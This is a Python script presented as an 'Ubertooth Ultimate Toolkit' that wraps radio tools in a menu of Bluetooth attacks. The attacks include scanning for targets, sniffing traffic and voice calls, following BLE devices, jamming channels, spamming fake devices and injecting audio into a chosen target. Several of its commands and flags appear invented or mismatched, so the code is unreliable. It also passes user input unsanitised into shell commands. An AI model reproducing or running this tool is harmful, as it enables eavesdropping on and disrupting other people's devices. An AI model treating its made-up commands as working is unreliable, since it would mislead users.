#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# UBERTOOTH ULTIMATE TOOLKIT v666 - ALL FUNCTIONS INCLUDED
#
# MIT License
# 
# Copyright (c) 2023 [Your Name or Organization]
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import os
import sys
import re
import time
import signal
import subprocess
import usb.core
from datetime import datetime
import colorama
from colorama import Fore, Style
from threading import Thread

colorama.init()

class UberUltimate:
    def __init__(self):
        self.targets = []
        self.attack_procs = []
        self.running = True
        signal.signal(signal.SIGINT, self.cleanup)
        self.check_root()
        self.check_ubertooth()
        self.show_banner()

    def check_root(self):
        if os.geteuid() != 0:
            print(f"{Fore.RED}🚫 Run as root: sudo {sys.argv[0]}{Style.RESET_ALL}")
            sys.exit(1)

    def check_ubertooth(self):
        dev = usb.core.find(idVendor=0x1D50, idProduct=0x6002)
        if not dev:
            print(f"{Fore.RED}🚨 Ubertooth not detected!{Style.RESET_ALL}")
            print("1. Check USB connection")
            print("2. Try 'lsusb | grep Ubertooth'")
            sys.exit(1)

    def show_banner(self):
        os.system('clear')
        print(f"""{Fore.MAGENTA}
   ___ _ _ _   ___ ___ _____ ___ ___ 
  | _ | | | |_| _ ) _|_   _|_ _/ _ \\
  | _ |_  _|_  _) _| | |  | | (_) |
  |___| |_| |_| |_|___| |_| |_|\___/
                                     
 ------------------------------------
    UBERTOOTH ULTIMATE TOOLKIT v666
   • All Standard Functions •
   • Custom Attacks •
   • Advanced Features •
 ------------------------------------
{Style.RESET_ALL}""")

    def cleanup(self, sig=None, frame=None):
        print(f"\n{Fore.RED}💀 Killing all processes...{Style.RESET_ALL}")
        for proc in self.attack_procs:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except:
                pass
        os.system("pkill -9 -f 'ubertooth|hcidump|btmon|sox'")
        sys.exit(0)

    def scan_devices(self):
        """Scan for all Bluetooth devices"""
        self.show_banner()
        print(f"{Fore.CYAN}🔍 Scanning for targets (20s)...{Style.RESET_ALL}")
        
        subprocess.Popen("ubertooth-util -l", shell=True)
        
        result = subprocess.run(["ubertooth-scan", "-t", "20"], 
                              capture_output=True, text=True)
        
        subprocess.run("ubertooth-util -L", shell=True)
        
        self.targets = []
        for line in result.stdout.split('\n'):
            if 'BD_ADDR' in line:
                mac = re.search(r'(([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})', line)
                if mac:
                    self.targets.append(mac.group(1))
        
        return len(self.targets) > 0

    def bt_classic_sniff(self, target=None):
        """Sniff Bluetooth Classic traffic"""
        cmd = "ubertooth-bt -A -f"
        if target:
            cmd += f" -t {target}"
        self.run_attack(cmd, "Bluetooth Classic Sniffing")

    def bt_voice_sniff(self, target=None):
        """Sniff Bluetooth voice calls"""
        cmd = "ubertooth-bt -S -f"
        if target:
            cmd += f" -t {target}"
        self.run_attack(cmd, "Voice Call Sniffing")

    def ble_sniff(self):
        """Sniff BLE advertisements"""
        self.run_attack("ubertooth-btle -a -f", "BLE Advertisement Sniffing")

    def ble_follow(self, target):
        """Follow specific BLE device"""
        self.run_attack(f"ubertooth-btle -t {target} -f", f"Following BLE Device {target}")

    def spectrum_analyzer(self):
        """2.4GHz spectrum analysis"""
        self.run_attack("ubertooth-specan", "Spectrum Analyzer")

    def channel_jam(self, target=None):
        """Jam Bluetooth channels"""
        cmd = "ubertooth-jam -b"
        if target:
            cmd += f" -t {target}"
        self.run_attack(cmd, "Channel Jamming")

    def ble_spam(self, count=100):
        """Spam fake BLE devices"""
        self.run_attack(f"ubertooth-btle -a -M -c {count}", f"BLE Spam ({count} fake devices)")

    def audio_injection(self, target, audio_file):
        """Inject audio to target device"""
        if not os.path.exists(audio_file):
            print(f"{Fore.RED}File not found!{Style.RESET_ALL}")
            return
        
        print(f"{Fore.YELLOW}Converting audio to raw format...{Style.RESET_ALL}")
        os.system(f"sox '{audio_file}' -r 8000 -c 1 -b 16 -e signed-integer /tmp/uber_audio.raw")
        
        self.run_attack(f"cat /tmp/uber_audio.raw | hstest /dev/stdin", 
                       f"Audio Injection to {target}")

    def wifi_bt_coex_attack(self):
        """WiFi/Bluetooth coexistence attack"""
        self.run_attack("ubertooth-jam -W -b", "WiFi/Bluetooth Coexistence Attack")

    def firmware_recovery(self):
        """Reset Ubertooth firmware"""
        print(f"{Fore.YELLOW}⚡ Resetting firmware...{Style.RESET_ALL}")
        os.system("ubertooth-dfu -d bluetooth_rxtx.dfu -U")
        time.sleep(3)

    def long_range_attack(self, target):
        """Long-range BLE attack"""
        self.run_attack(f"ubertooth-btle -t {target} -p 2", "Long-Range BLE Attack")

    def run_attack(self, cmd, description):
        """Execute attack with proper process handling"""
        self.show_banner()
        print(f"{Fore.RED}⚡ {description}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Command: {cmd}{Style.RESET_ALL}")
        
        proc = subprocess.Popen(cmd, shell=True,
                              stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE,
                              preexec_fn=os.setsid)
        self.attack_procs.append(proc)
        
        print(f"\n{Fore.YELLOW}Press Enter to stop...{Style.RESET_ALL}")
        input()
        proc.kill()

    def main_menu(self):
        """Main interactive menu"""
        while self.running:
            self.show_banner()
            print(f"\n{Fore.GREEN}=== MAIN MENU ==={Style.RESET_ALL}")
            print("1. Scan for devices")
            print("2. Bluetooth Classic attacks")
            print("3. BLE attacks")
            print("4. Custom attacks")
            print("5. Advanced features")
            print("0. Exit")
            
            choice = input("\nSelect option: ")
            
            if choice == "1":
                if self.scan_devices():
                    self.show_targets()
            elif choice == "2":
                self.bt_classic_menu()
            elif choice == "3":
                self.ble_menu()
            elif choice == "4":
                self.custom_attacks_menu()
            elif choice == "5":
                self.advanced_menu()
            elif choice == "0":
                self.running = False
            else:
                print(f"{Fore.RED}Invalid option!{Style.RESET_ALL}")
                time.sleep(1)

    def show_targets(self):
        """Show scanned targets"""
        self.show_banner()
        print(f"\n{Fore.GREEN}=== SCAN RESULTS ==={Style.RESET_ALL}")
        for i, target in enumerate(self.targets, 1):
            print(f"{i}. {target}")
        input("\nPress Enter to continue...")

    def bt_classic_menu(self):
        """Bluetooth Classic menu"""
        while True:
            self.show_banner()
            print(f"\n{Fore.BLUE}=== BLUETOOTH CLASSIC ==={Style.RESET_ALL}")
            print("1. Sniff ACL data")
            print("2. Sniff voice calls")
            print("3. Channel jamming")
            print("4. Back to main menu")
            
            choice = input("\nSelect option: ")
            
            if choice == "1":
                target = self.select_target()
                self.bt_classic_sniff(target)
            elif choice == "2":
                target = self.select_target()
                self.bt_voice_sniff(target)
            elif choice == "3":
                target = self.select_target()
                self.channel_jam(target)
            elif choice == "4":
                break
            else:
                print(f"{Fore.RED}Invalid option!{Style.RESET_ALL}")
                time.sleep(1)

    def ble_menu(self):
        """BLE menu"""
        while True:
            self.show_banner()
            print(f"\n{Fore.CYAN}=== BLE ATTACKS ==={Style.RESET_ALL}")
            print("1. Sniff advertisements")
            print("2. Follow specific device")
            print("3. BLE spam attack")
            print("4. Back to main menu")
            
            choice = input("\nSelect option: ")
            
            if choice == "1":
                self.ble_sniff()
            elif choice == "2":
                target = self.select_target()
                self.ble_follow(target)
            elif choice == "3":
                count = input("Number of fake devices [100]: ") or "100"
                self.ble_spam(int(count))
            elif choice == "4":
                break
            else:
                print(f"{Fore.RED}Invalid option!{Style.RESET_ALL}")
                time.sleep(1)

    def custom_attacks_menu(self):
        """Custom attacks menu"""
        while True:
            self.show_banner()
            print(f"\n{Fore.RED}=== CUSTOM ATTACKS ==={Style.RESET_ALL}")
            print("1. Audio injection")
            print("2. WiFi/BT coexistence attack")
            print("3. Back to main menu")
            
            choice = input("\nSelect option: ")
            
            if choice == "1":
                target = self.select_target()
                audio = input("Path to audio file: ")
                self.audio_injection(target, audio)
            elif choice == "2":
                self.wifi_bt_coex_attack()
            elif choice == "3":
                break
            else:
                print(f"{Fore.RED}Invalid option!{Style.RESET_ALL}")
                time.sleep(1)

    def advanced_menu(self):
        """Advanced features menu"""
        while True:
            self.show_banner()
            print(f"\n{Fore.YELLOW}=== ADVANCED FEATURES ==={Style.RESET_ALL}")
            print("1. Spectrum analyzer")
            print("2. Firmware recovery")
            print("3. Long-range BLE attack")
            print("4. Back to main menu")
            
            choice = input("\nSelect option: ")
            
            if choice == "1":
                self.spectrum_analyzer()
            elif choice == "2":
                self.firmware_recovery()
            elif choice == "3":
                target = self.select_target()
                self.long_range_attack(target)
            elif choice == "4":
                break
            else:
                print(f"{Fore.RED}Invalid option!{Style.RESET_ALL}")
                time.sleep(1)

    def select_target(self):
        """Let user select a target"""
        if not self.targets:
            print(f"{Fore.YELLOW}No targets! Scanning first...{Style.RESET_ALL}")
            if not self.scan_devices():
                return None
        
        self.show_banner()
        print(f"\n{Fore.GREEN}=== TARGETS ==={Style.RESET_ALL}")
        for i, target in enumerate(self.targets, 1):
            print(f"{i}. {target}")
        
        choice = input("\nSelect target (1-9) or 's' to scan: ")
        if choice.lower() == 's':
            self.scan_devices()
            return self.select_target()
        elif choice.isdigit() and 1 <= int(choice) <= len(self.targets):
            return self.targets[int(choice)-1]
        else:
            print(f"{Fore.RED}Invalid selection!{Style.RESET_ALL}")
            return None

if __name__ == "__main__":
    required = ['ubertooth-scan', 'ubertooth-bt', 'ubertooth-btle', 'ubertooth-jam', 'sox']
    missing = [cmd for cmd in required if not subprocess.getoutput(f"which {cmd}")]
    if missing:
        print(f"{Fore.RED}Missing tools: {', '.join(missing)}{Style.RESET_ALL}")
        sys.exit(1)
    
    tool = UberUltimate()
    try:
        tool.main_menu()
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
    finally:
        tool.cleanup()
